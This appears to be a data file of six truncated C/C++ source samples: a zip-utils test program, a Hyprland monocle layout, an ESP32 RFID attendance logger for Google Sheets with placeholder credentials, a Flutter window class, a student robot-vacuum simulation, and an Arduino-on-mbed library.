    "#include <windows.h>\n#include <tchar.h>\n#include <stdio.h>\n#include \"../../zip.h\"\n#include \"../../unzip.h\"\n\n// This program runs a bunch of test cases on zip/unzip.\n// Most of the test cases come from bugs that had been reported\n// in an earlier version of the ziputils, to be sure that they're fixed.\n\n\n\nbool tsame(const FILETIME t0, const FILETIME t1)\n{ if (t0.dwHighDateTime!=t1.dwHighDateTime) return false;\n  if ( (t0.dwLowDateTime>>28) != (t1.dwLowDateTime>>28)) return false;\n  return true;\n  // we allow some flexibility in the lower bits. That's because zip's don't store times with as much precision.\n}\n\nbool fsame(const TCHAR *fn0, const TCHAR *fn1)\n{ HANDLE hf0=CreateFile(fn0,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);\n  HANDLE hf1=CreateFile(fn1,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);\n  if (hf0==INVALID_HANDLE_VALUE || hf1==INVALID_HANDLE_VALUE)\n  { if (hf0!=INVALID_HANDLE_VALUE) CloseHandle(hf0);\n    if (hf1!=INVALID_HANDLE_VALUE) CloseHandle(hf1);\n    return false;\n  }\n  DWORD size0=GetFileSize(hf0,0), size1=GetFileSize(hf1,0);\n  if (size0!=size1) {CloseHandle(hf0); CloseHandle(hf1); return false;}\n  DWORD size=size0;\n  //\n  char *buf[2]; buf[0]=new char[16384]; buf[1]=new char[16384];\n  DWORD done=0;\n  while (done<size)\n  { DWORD left=size-done; if (left>16384) left=16384;\n    DWORD red; ReadFile(hf0,buf[0],left,&red,0); ReadFile(hf1,buf[1],left,&red,0);\n    if (memcmp(buf[0],buf[1],left)!=0) break;\n    done+=left;\n  }\n  delete[] buf[0]; delete[] buf[1];\n  CloseHandle(hf0); CloseHandle(hf1);\n  return (done==size);\n}\n\nvoid SaveResource(const TCHAR *res, const TCHAR *fn)\n{ HINSTANCE hInstance = GetModuleHandle(0);\n  HRSRC hrsrc=FindResource(hInstance,res,RT_RCDATA);\n  HANDLE hglob = LoadResource(hInstance,hrsrc);\n  void *buf=LockResource(hglob);\n  unsigned int len=SizeofResource(hInstance,hrsrc);\n  HANDLE hf = CreateFile(fn,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);\n  DWORD writ; WriteFile(hf,buf,len,&writ,0);\n  CloseHandle(hf);\n}\n\nbool any_errors=false; bool p_abort=false;\nvoid msg(const TCHAR *s)\n{ if (s[0]=='*') any_errors=true;\n#ifdef UNDER_CE\n  int res=IDOK;\n  if (s[0]=='*') res=MessageBox(0,s,_T(\"Zip error\"), MB_ICONERROR|MB_OKCANCEL);\n  else if (s[0]=='.') MessageBeep(0);\n  else MessageBox(0,s,_T(\"Zip test\"),MB_OKCANCEL);\n  if (res==IDCANCEL) p_abort=true;\n#else\n  _tprintf(_T(\"%s\\n\"),s);\n#endif\n}\n\n\nvoid main()\n{ HZIP hz; HANDLE hf; DWORD writ; ZRESULT zr; ZIPENTRY ze; TCHAR m[1024];\n  bool fast=false;\n#ifdef UNDER_CE\n  fast=true;\n#endif\n#ifdef __CODEGUARD__\n  fast=true;\n#endif\n  \n\n  msg(_T(\"Zip-utils tests. Files will be left in \\\"\\\\z\\\"\"));\n  CreateDirectory(_T(\"\\\\z\"),0);\n  SaveResource(MAKEINTRESOURCE(1),_T(\"\\\\z\\\\extra.zip\"));\n  SaveResource(MAKEINTRESOURCE(2),_T(\"\\\\z\\\\ce2ce.jpg\"));\n  SaveResource(MAKEINTRESOURCE(3),_T(\"\\\\z\\\\ce2ce.txt\"));\n\n\n  \n\n  // fixed bug: OpenZip errors and returns0 when you try to open a zip with no files in it\n  msg(_T(\"empty - testing whether it fails to open empty zipfiles\"));\n  hz=CreateZip(_T(\"\\\\z\\\\empty.zip\"),0); if (hz==0) msg(_T(\"* Failed to create empty.zip\"));\n  zr=CloseZip(hz); if (zr!=ZR_OK) msg(_T(\"* Failed to close empty.zip\"));\n  if (p_abort) return;\n  hz=OpenZip(_T(\"\\\\z\\\\empty.zip\"),0); if (hz==0) msg(_T(\"* Failed to open empty.zip\"));\n  zr=GetZipItem(hz,-1,&ze); if (zr!=ZR_OK) msg(_T(\"* Failed to get empty.zip index\"));\n  zr=CloseZip(hz); if (zr!=ZR_OK) msg(_T(\"* Failed to close empty.zip\"));\n  if (p_abort) return;\n\n  // fixed bug: IsZipHandle should return false for a NULL handle.\n  msg(_T(\"IsZipHandle - testing whether 0 is considered a handle\"));\n  bool b = IsZipHandleZ(0) || IsZipHandleU(0);\n  if (b) msg(_T(\"IsZipHandle failed to deny handlehood of NULL\"));\n  if (p_abort) return;\n  \n  // fixed bug: if one file is bigger then the following must be smaller than 64k -- diff. between release and debug mode\n  // fixed bug: test0=71k, test1=152.2k, test2=145b, test3=120k, here test3 returns ZR_WRITE\n  msg(_T(\"sizes - testing whether large-then-small files work okay\"));\n  { char *c=new char[200*1024]; for (int i=0; i<200*1024; i++) c[i]=(char)(rand()%255);\n    hf=CreateFile(_T(\"\\\\z\\\\sizes-71k.dat\"),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); WriteFile(hf,c,71*1024,&writ,0); CloseHandle(hf);\n    hf=CreateFile(_T(\"\\\\z\\\\sizes-152_2k.dat\"),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); WriteFile(hf,c,152*1024+1024/5,&writ,0); CloseHandle(hf);\n    hf=CreateFile(_T(\"\\\\z\\\\sizes-145b.dat\"),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); WriteFile(hf,c,145,&writ,0); CloseHandle(hf);\n    hf=CreateFile(_T(\"\\\\z\\\\sizes-120k.dat\"),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); WriteFile(hf,c,120*1024,&writ,0); CloseHandle(hf);\n    delete[] c;\n  }\n  //\n  hz=CreateZip(_T(\"\\\\z\\\\sizes.zip\"),0); if (hz==0) msg(_T(\"* Failed to create sizes.zip\"));\n  zr=ZipAdd(hz,_T(\"sizes-71k.out.dat\"),_T(\"\\\\z\\\\sizes-71k.dat\")); if (zr!=ZR_OK) msg(_T(\"* Failed to add 71k\"));\n  zr=ZipAdd(hz,_T(\"sizes-152_2k.out.dat\")",
    "#include <hyprland/src/Compositor.hpp>\n#include <hyprland/src/desktop/DesktopTypes.hpp>\n#include <hyprland/src/desktop/Workspace.hpp>\n#include <hyprland/src/helpers/MiscFunctions.hpp>\n#include <hyprland/src/render/decorations/CHyprGroupBarDecoration.hpp>\n#include <format>\n#include <hyprland/src/render/decorations/IHyprWindowDecoration.hpp>\n#include \"monocleLayout.hpp\"\n\n\nSMonocleNodeData* CHyprMonocleLayout::getNodeFromWindow(PHLWINDOW pWindow) {\n    for (auto& nd : m_lMonocleNodesData) {\n        if (nd.pWindow.lock() == pWindow)\n            return &nd;\n    }\n\n    return nullptr;\n}\n\nint CHyprMonocleLayout::getNodesOnWorkspace(const int& ws) {\n    int no = 0;\n    for (auto& n : m_lMonocleNodesData) {\n        if (n.workspaceID == ws)\n            no++;\n    }\n\n    return no;\n}\n\nstd::string CHyprMonocleLayout::getLayoutName() {\n    return \"Monocle\";\n}\n\nvoid CHyprMonocleLayout::onWindowCreatedTiling(PHLWINDOW pWindow, eDirection direction) {\n    if (pWindow->m_bIsFloating)\n        return;\n\n\t\tconst auto WSID = pWindow->workspaceID();\n\t\t\n\t\t\t\n    const auto         PMONITOR = g_pCompositor->getMonitorFromID(pWindow->m_iMonitorID);\n\n    auto               OPENINGON = g_pCompositor->m_pLastWindow.lock() && g_pCompositor->m_pLastWindow.lock()->m_pWorkspace == pWindow->m_pWorkspace ? g_pCompositor->m_pLastWindow.lock() : nullptr;\n\n\t\tconst auto\t\t\t\tMOUSECOORDS = g_pInputManager->getMouseCoordsInternal();\n\t\t\n\n\n\n\t\tif (g_pInputManager->m_bWasDraggingWindow && OPENINGON) {\n\t\t\tif (pWindow->checkInputOnDecos(INPUT_TYPE_DRAG_END, MOUSECOORDS, pWindow))\n\t\t\t\treturn;\n\t\t}\n\n    if (OPENINGON && OPENINGON != pWindow && OPENINGON->m_sGroupData.pNextWindow.lock() // target is group\n        && pWindow->canBeGroupedInto(OPENINGON)) {\n\n\n        static const auto* USECURRPOS = (Hyprlang::INT* const*)g_pConfigManager->getConfigValuePtr(\"group:insert_after_current\");\n        (**USECURRPOS ? OPENINGON : OPENINGON->getGroupTail())->insertWindowToGroup(pWindow);\n\n        OPENINGON->setGroupCurrent(pWindow);\n        pWindow->applyGroupRules();\n        pWindow->updateWindowDecos();\n        recalculateWindow(pWindow);\n        if(!pWindow->getDecorationByType(DECORATION_GROUPBAR))\n\t\t\t      pWindow->addWindowDeco(std::make_unique<CHyprGroupBarDecoration>(pWindow));\n\n        return;\n    }\n\n    pWindow->applyGroupRules();\n    const auto PNODE = &m_lMonocleNodesData.emplace_front();\n\t  PNODE->workspaceID = pWindow->workspaceID();\n\t  PNODE->pWindow = pWindow;\n    if (g_pCompositor->getWorkspaceByID(WSID)->m_bHasFullscreenWindow) {\n\t      g_pCompositor->setWindowFullscreen(g_pCompositor->getFullscreenWindowOnWorkspace(pWindow->workspaceID()), false, FULLSCREEN_FULL);\n    }\n\n    recalculateMonitor(pWindow->m_iMonitorID);\n\t  g_pCompositor->setWindowFullscreen(pWindow, true, FULLSCREEN_MAXIMIZED);\n\t  g_pCompositor->focusWindow(pWindow);\n}\n\nvoid CHyprMonocleLayout::onWindowRemovedTiling(PHLWINDOW pWindow) {\n    const auto PNODE = getNodeFromWindow(pWindow);\n\n    if (!PNODE)\n        return;\n\n    pWindow->m_sSpecialRenderData.rounding = true;\n    pWindow->m_sSpecialRenderData.border   = true;\n    pWindow->m_sSpecialRenderData.decorate = true;\n\n    if (pWindow->m_bIsFullscreen)\n        g_pCompositor->setWindowFullscreen(pWindow, false, FULLSCREEN_FULL);\n\n    m_lMonocleNodesData.remove(*PNODE);\n\n    recalculateMonitor(pWindow->m_iMonitorID);\n\t  \n}\n\nvoid CHyprMonocleLayout::recalculateMonitor(const int& monid) {\n    const auto PMONITOR   = g_pCompositor->getMonitorFromID(monid);\n    const auto PWORKSPACE = PMONITOR->activeWorkspace;\n\n    if (!PWORKSPACE)\n        return;\n\n    g_pHyprRenderer->damageMonitor(PMONITOR);\n\n    if (PMONITOR->activeSpecialWorkspace) {\n        calculateWorkspace(PMONITOR->activeSpecialWorkspace);\n    }\n\n    if (PWORKSPACE->m_bHasFullscreenWindow) {\n        if (PWORKSPACE->m_efFullscreenMode == FULLSCREEN_FULL)\n            return;\n\n        // massive hack from the fullscreen func\n        const auto      PFULLWINDOW = g_pCompositor->getFullscreenWindowOnWorkspace(PWORKSPACE->m_iID);\n\n        SMonocleNodeData fakeNode;\n        fakeNode.pWindow         = PFULLWINDOW;\n        fakeNode.position        = PMONITOR->vecPosition + PMONITOR->vecReservedTopLeft;\n        fakeNode.size            = PMONITOR->vecSize - PMONITOR->vecReservedTopLeft - PMONITOR->vecReservedBottomRight;\n        fakeNode.workspaceID     = PWORKSPACE->m_iID;\n        PFULLWINDOW->m_vPosition = fakeNode.position;\n        PFULLWINDOW->m_vSize     = fakeNode.size;\n\n        applyNodeDataToWindow(&fakeNode);\n\n        return;\n    }\n\n    // calc the WS\n    calculateWorkspace(PWORKSPACE);\n}\n\nvoid CHyprMonocleLayout::calculateWorkspace(PHLWORKSPACE PWORKSPACE) {\n    if (!PWORKSPACE)\n        return;\n\n    const auto         PMONITOR = g_pCompositor->getMonitorFromID(PWORKSPACE->m_iMonitorID);\n\t  for(auto &md : m_lMonocleNodesData) {\n        if (md.workspaceID != PWORKSPACE->m_iID)\n\t\t\t    continue;\n\t\t   \tmd.position = PMONITOR->vecPosition  + PMONITOR->vecReservedTopLeft + Vector2D(0.0f, 0.",
    "// Projecto de registro de asistencia usando ESP32 + RFID MFRC522 + Google Spreadsheet\n// Toma como base el ejemplo de la librer\u00eda ESP Google Sheet Client\n// https://github.com/mobizt/ESP-Google-Sheet-Client/tree/master/examples/Values/Create_Update_Read\n\n#include <Arduino.h>\n#include <WiFi.h>\n#include <ESP_Google_Sheet_Client.h>\n#include \"time.h\"\n#include <SPI.h>\n#include <MFRC522.h>\n#include <Wire.h> \n#include <LiquidCrystal_I2C.h>\n\n// Auxiliar para montaje de la SD\n#include <GS_SDHelper.h>\n\n// Credenciales para la conexi\u00f3n WIFI\n#define WIFI_SSID \"SSID\"\n#define WIFI_PASSWORD \"PASSWORD\"\n\n// Credenciales para la conexi\u00f3n al servicio de Google\n#define PROJECT_ID \"NOMBRE_PROYECTO\"\n#define CLIENT_EMAIL \"CLIENTE DE CORREO COMPARTIDO\"\n#define USER_EMAIL \"CORREO DEL USUARIO\"\nconst char PRIVATE_KEY[] PROGMEM = \"-----BEGIN PRIVATE KEY----- clave privada -----END PRIVATE KEY-----\\n\";\nconst char SPREADSHEETID[] = \"PARTE DE LA URL QUE IDENTIFICA UNIVOCAMENTE A ESA PLANILLA DE C\u00c1LCULO\";\n\n// RFID - MFRC522\n\n// Conexi\u00f3n (para ESP32) usando SPI\n// SS/SDA -> D5\n// SCK    -> D18\n// MOSI   -> D23\n// MISO   -> D19\n// GND    -> GND\n// VCC    -> 3.3V\n// RST    -> D0\nconst int RST_PIN = 0;\nconst int SS_PIN = 5;\n\n// Instancia del lector RFID\nMFRC522 rfid(SS_PIN, RST_PIN); \n\nMFRC522::MIFARE_Key key; \n\n// Display LCD 16x2\n\n// Conexi\u00f3n para ESP32\n// SDA    -> D21\n// SCL    -> D22\n// GND    -> GND\n// VCC    -> 5v\nLiquidCrystal_I2C lcd(0x27, 16, 2);\n\n// LEDs de se\u00f1alizaci\u00f3n\nconst int LED_ROJO_ERROR = 25;\nconst int LED_VERDE_OK   = 26;\nconst int LED_AMARILLO_EN_PROCESO = 27;\nconst int LED_AZUL_POWER = 33;\n\n\n// Servidor de Fecha + Hora\nconst char* ntpServer = \"pool.ntp.org\";\n// Diferencia horaria en segundos para el timezone de R\u00edo Gallegos, Argentina\nconst long  gmtOffset_sec = -10800;\n\n// Funci\u00f3n auxiliar para el token de conexi\u00f3n con Google\nvoid tokenStatusCallback(TokenInfo info);\n\n// Funci\u00f3n auxiliar para mostrar mensajes en el LCD\nvoid mostrar_mensajes(String linea1, String linea2){\n  lcd.clear();\n  lcd.setCursor(0, 0);\n  lcd.print(linea1);\n  lcd.setCursor(0, 1);\n  lcd.print(linea2);\n\n}\n\n// Array auxiliar para ilustrar el avance de la conexi\u00f3n al WiFi\nchar espera[] = { '-', '\\\\', '|', '/' };\n\n\nvoid setup()\n{\n\n    Serial.begin(115200);\n    Serial.println();\n    Serial.println();\n\n    // LEDs indicadores\n    pinMode(LED_ROJO_ERROR, OUTPUT);\n    pinMode(LED_VERDE_OK, OUTPUT);\n    pinMode(LED_AMARILLO_EN_PROCESO, OUTPUT);\n    pinMode(LED_AZUL_POWER, OUTPUT);\n\n    // LED ROJO encendido\n    digitalWrite(LED_ROJO_ERROR, HIGH);\n    digitalWrite(LED_AZUL_POWER, LOW);\n    digitalWrite(LED_AMARILLO_EN_PROCESO, LOW);\n    digitalWrite(LED_VERDE_OK, LOW);\n\n    // RFID\n    SPI.begin();\n    rfid.PCD_Init();\n\n    // LCD\n    lcd.init(); \n    lcd.backlight();\n    lcd.setCursor(1, 0);\n    lcd.print(\"Control Asistencia\");\n\n\n    // Configuraci\u00f3n de la zona horaria para el servidor NTP\n    configTime(gmtOffset_sec, 0, ntpServer);\n\n    GSheet.printf(\"ESP Google Sheet Client v%s\\n\\n\", ESP_GOOGLE_SHEET_CLIENT_VERSION);\n    \n\n    #if defined(ESP32) || defined(ESP8266)\n        WiFi.setAutoReconnect(true);\n    #endif\n\n    WiFi.begin(WIFI_SSID, WIFI_PASSWORD);\n\n    unsigned long ms = millis();\n    int avance = 0;\n    while (WiFi.status() != WL_CONNECTED)\n    {\n      avance ++;\n      mostrar_mensajes(\"Conectando WiFi...\", String(espera[avance % 4]));\n      delay(300);\n    }\n\n    // Una vez conectado, apago LED_ROJO y enciendo LED_AZUL\n    digitalWrite(LED_ROJO_ERROR, LOW);\n    digitalWrite(LED_AZUL_POWER, HIGH);\n\n    mostrar_mensajes(\"Connectado IP: \", String(WiFi.localIP()));\n\n    // Seteo de par\u00e1metros de la librer\u00eda Google Sheet \n    // Establecer callBack para el estado de generaci\u00f3n del token de acceso a la API de Google (s\u00f3lo para depuraci\u00f3n)\n    GSheet.setTokenCallback(tokenStatusCallback);\n    // Establezca los segundos para actualizar el token de autenticaci\u00f3n antes de que caduque (de 60 a 3540, por defecto 300 segundos).\n    GSheet.setPrerefreshSeconds(10 * 60);\n    // Iniciar la generaci\u00f3n del token de acceso para la autenticaci\u00f3n de Google API\n    GSheet.begin(CLIENT_EMAIL, PROJECT_ID, PRIVATE_KEY);\n\n\n}\n\nvoid loop()\n{\n\n  // Detecto si hay una nueva tarjeta presente\n  if (rfid.PICC_IsNewCardPresent()){\n    // Si la puedo leer\n    if (rfid.PICC_ReadCardSerial()){\n\n        MFRC522::StatusCode status;\n        byte blockAddr = 4;\n        String strNombre;\n\n        // Enciendo LED_AMARILLO para indicar que esta en proceso\n        digitalWrite(LED_AMARILLO_EN_PROCESO, HIGH);\n\n        // Llamar a ready() repetidamente en bucle para comprobar y procesar la autenticaci\u00f3n\n        bool ready = GSheet.ready();\n\n        if (ready)\n        {\n\n            FirebaseJson response;\n            FirebaseJson valueRange;\n\n            // Leer el ID\n            String strUID = String(rfid.uid.uidByte[0], HEX) + \" \" + String(rfid.uid.uidByte[1], HEX) + \" \" + String(rfid.uid.uidByte[2], HEX) + \" \" + String(rfid.uid.uidByte[3], HEX);\n            // Obtener d\u00eda y hora\n         ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <iomanip> \r\nusing namespace std;\r\n\r\nclass Robot {\r\nprotected:\r\n    int batteryLife;\r\n    int* cleaningArea;\r\n    int* cleaningTime;\r\n    int hiz[2];\r\n\r\npublic:\r\n    virtual void move(int hedefX, int hedefY) = 0;\r\n    Robot() {\r\n        \r\n        hiz[0] = 0;\r\n        hiz[1] = 1;\r\n        cleaningArea = new int;\r\n\t\tbatteryLife = 100;\r\n        cleaningTime = new int;\r\n    }\r\n\r\n    virtual ~Robot() {\r\n        delete cleaningArea;\r\n        delete cleaningTime;\r\n    }\r\n};\r\n\r\nclass RobotSweeper : protected Robot {\r\nprivate:\r\n\t\tint *currentX;\r\n\t\tint *currentY;\r\n\t\tint *currentBatteryLife;\r\n\t\tint *x2;\r\n\t\tint *y2;\r\n\t\tint *paspas_suyu;\t\r\n\r\npublic:\r\n    RobotSweeper() : currentX(new int(0)), currentY(new int(0)), currentBatteryLife(new int(100)), paspas_suyu(new int(0)), x2(new int(0)), y2(new int(0)) { }\r\n    ~RobotSweeper() {\r\n        delete currentX;\r\n        delete currentY;\r\n        delete currentBatteryLife;\r\n        delete x2;\r\n        delete y2;\r\n        delete paspas_suyu;\r\n    }\r\n  \tint &cleaningtime_getir(){\r\n\t\treturn *cleaningTime;\r\n\t\t}\r\n\tint &batterylife_getir(){\r\n\t\treturn *currentBatteryLife;\r\n\t\t}\r\n\r\n\tvoid vacuum(){\r\n\t\t\tif (*currentBatteryLife <= 5) {\r\n              \trobotu_sarj_etme();}\r\n            else{\r\n\t\t\t}\r\n\t\t\t}\t\r\n\t\t\t\r\n\tvoid mop() {\r\n    \tif (*paspas_suyu > 0 && *currentBatteryLife > 5) {\r\n        \tif (hiz[0] == 1) {\r\n            \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.02);\r\n\t\t\t\t*paspas_suyu -= 1;}\r\n\t\t\t\t\r\n            else {\r\n            \t*currentBatteryLife = (*currentBatteryLife )- (*currentBatteryLife * 0.03);\r\n\t\t\t\t*paspas_suyu -= 1;}\r\n        }\r\n        else{\r\n\t        robotu_sarj_etme();\r\n\t\t\t}\r\n    }\r\n\r\n\tvoid sarj_istasyonuna_gitme() {\r\n    \t*x2 = *currentX;\r\n    \t*y2 = *currentY;\r\n    \t*currentX = 0;\r\n    \t*currentY = 0;\r\n\t\t}\r\n\tvoid robotu_sarj_etme(){\r\n\t\tsarj_istasyonuna_gitme();\r\n\t\t*currentBatteryLife = 100;\r\n\t\t*cleaningTime +=10;\r\n\t\t(*currentX) = (*x2)  ; \r\n    \t(*currentY) =(*y2) ; \r\n\t}\r\n\r\n\t\r\n\tRobotSweeper& operator=(const RobotSweeper& n) {\r\n   \t\t\t*y2 = *n.y2;\r\n   \t\t\t*x2 = *n.x2;\r\n   \t\t\t*cleaningTime = *n.cleaningTime;\r\n   \t\t\t*paspas_suyu = *n.paspas_suyu;\r\n        \t*currentBatteryLife = *n.currentBatteryLife;\r\n        \t*currentX = *n.currentX;\r\n        \t*currentY = *n.currentY;\r\n     \t\treturn *this;\r\n   }\r\n    void move(int x,int y) override {\r\n\t\tif(*currentBatteryLife <= 5){\r\n\t\t\tcout << \"Hareket icin yeterli enerji yok\" << endl;\r\n\t\t\trobotu_sarj_etme();\r\n\t\t\t}\r\n\t\tint x_mesafe = x - (*currentX);\r\n\t\tint y_mesafe = y - (*currentY);\r\n\t\tif(x_mesafe>0 || y_mesafe > 0) {\r\n\t\t\t(*currentY) += 1;\r\n\t\t}\r\n\t\tif(x_mesafe<0 || currentY < 0) {\r\n\t\t\t(*currentY) += 1;\r\n\t\t}\r\n    \tif (x_mesafe < 0) {\r\n        \t(*currentX) -= 1;\r\n    \t}\r\n    \tif (x_mesafe > 0) {\r\n        (*currentX) += 1;\r\n    \t}\r\n    \tif (currentY < 0) {\r\n        \t(*currentY) -= 1;\r\n    \t}\r\n    \tif (currentY > 0) {\r\n        \t(*currentY) += 1;\r\n    \t}\r\n\r\n\t\tif (hiz[0] == 1) {\r\n        \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.01);\r\n        \t*cleaningTime += 2;}\t\t\r\n    \telse {\r\n        \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.02);\r\n\t\t\t*cleaningTime += 1;\r\n\t\t\t}\r\n\t\t\t}\r\n\r\n};\r\nclass House{\r\n\tpublic:\r\n\t\tint x;\r\n\t\tint y;\r\n\t\tHouse() : x(0), y(0) {}\r\n\t\t\r\n};\r\nclass Room:public House{\r\npublic:\r\n\tint x1;\r\n\tint y1;\r\n\tint obstacleX;\r\n\tint obstacleY;\r\n\tRoom() : x1(0), y1(0),obstacleX(0),obstacleY(0){}\r\n\tint getRoom() const {\r\n        cout << \"Oda Bilgisi:\" << endl;\r\n        cout << \"Kordinatlar: (\" << x1 << \", \" << y1 << \")\" << std::endl;\r\n        cout << \"Engel Kordinatlari: (\" << obstacleX << \", \" << obstacleY << \")\" << std::endl;\r\n        return x1 + y1 + obstacleX + obstacleY;\r\n    }\r\n};\r\nclass Area:public House{\r\npublic:\r\n\tint edgeX;\r\n\tint edgeY;\r\n\tArea() : edgeX(0), edgeY(0){}\r\n\tint getArea() const {\r\n        std::cout << \"Konum Bilgisi:\" << std::endl;\r\n        std::cout << \"Engel Kordinatlari: (\" << edgeX << \", \" << edgeY << \")\" << std::endl;\r\n        return edgeX * edgeY;\r\n    }\r\n};\r\nvoid harita_dosyasi_okuma(const std::string& dosyaadi, std::vector<Room>& odalar, std::vector<std::pair<int, int>>& engel) {\r\n    ifstream inputFile(dosyaadi);\r\n    string obje_turu;\r\n    if (!inputFile) {\r\n        cerr << \"Dosya acilamadi !!\" << endl;\r\n        exit(EXIT_FAILURE);\r\n    }\r\n\r\n    while (inputFile >> obje_turu) {\r\n        if (obje_turu == \"Room\") {\r\n            Room oda;\r\n            inputFile >> oda.x1 >> oda.y1 >> oda.obstacleX >> oda.obstacleY;\r\n            odalar.push_back(oda);\r\n        } else if (obje_turu == \"Obstacle\") {\r\n            int engel_x;\r\n\t\t\tint engel_y;\r\n            inputFile >> engel_x >> engel_y;\r\n            engel.emplace_back(engel_x, engel_y);\r\n        }\r\n    }\r\n\r\n    inputFile.close();\r\n}\r\n\r\n\r\nvoid cleanArea(RobotSweeper& robot, int ilk_x, int ilk_y, int son_x, int son_y, const vector<pair<int, int>>& engeller) {\r\n    int& cleaningTime = robot.cleaningtime_getir();\r\n    int& batt",
    "/**\n * @section LICENSE\n *  Copyright (c) 2012\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n *\n * @section DESCRIPTION\n *  This is a library for allowing the use of programs written for the Arduino\n *  with the mbed. This was started for use with the Gameduino shield Library.\n *  It is currently uncomplete and not fully tested, but I don't see myself spending time on it. \n *  See TODOs and check http://arduino.cc/en/Reference/HomePage for missing parts\n *\n * @file arduino.c\n *\n * Example:\n * @code\n * \n * #include \"mbed.h\"\n * #include \"arduino.h\"\n * \n * void setup(){\n * // setup code\n * }\n *\n *void loop(){\n * // loop code\n *}\n *\n * int main() {\n *   timer_start();\n *   setup();\n *   while(1) {\n *       loop();\n *   }\n * }\n * @endcode\n */\n #include \"arduino.h\"\n \n/*****************************************************  \n  Digital I/O\n \n    pinMode()- TODO\n    digitalWrite()- TODO\n    digitalRead()- TODO\n    \n******************************************************/\n \n/*****************************************************  \n  Analog I/O\n \n    analogReference() - TODO\n    analogRead() - TODO\n    analogWrite()-(PWM) - TODO\n    \n*****************************************************/\n \n/*****************************************************\n  Advanced I/O\n \n    tone() - TODO\n    noTone() - TODO\n    shiftOut() - TODO\n    shiftIn() - TODO\n    pulseIn() - TODO\n    \n*****************************************************/ \n \n/*****************************************************  \n  Time\n    \n    millis() - need to start timer first\n    micros() - need to start timer first\n    delay() - done by Macro\n    delayMicroseconds() - Done byMacro\n    \n*****************************************************/\n \nTimer arduino_timer;\n/** start the arduino_timer timer for millis() and micros() running.\n *\n * @param void\n */\nvoid timer_start(void) {\n    arduino_timer.start();\n}\n/** return a long for the amount of time since the timer was started in milliseconds.\n *\n * @param void\n */\nlong millis(void) {\n    return arduino_timer.read_ms();\n}\n/** return a long for the amount of time since the timer was started in microseconds.\n *\n * @param void\n */\nlong micros(void) {\n    return arduino_timer.read_us();\n}\n \n \n/*****************************************************\n  Maths\n \n    min()  - done by Macro\n    max()  - done by Macro\n    abs()  - done by Macro\n    constrain() - TODO\n    map() - TODO\n    pow() - implemented by including math.h\n    sqrt() - implemented by including math.h\n    \n*****************************************************/\n \n \n/*****************************************************\n  Trigonometry\n \n    sin() - implemented by including math.h\n    cos() - implemented by including math.h\n    tan() - implemented by including math.h\n    \n*****************************************************/\n \n/*****************************************************\n  Random Numbers\n \n    randomSeed()  - done by Macro\n    random() - function below\n    \n*****************************************************/\n \n/** generates a random number from 0 to defined number\n *\n * @param number maximum value for random number\n */\nint random(int number) {\n    return (rand()%number);\n}\n/** generates a random number between two numbers\n *\n * @param numberone minimum value for random number\n * 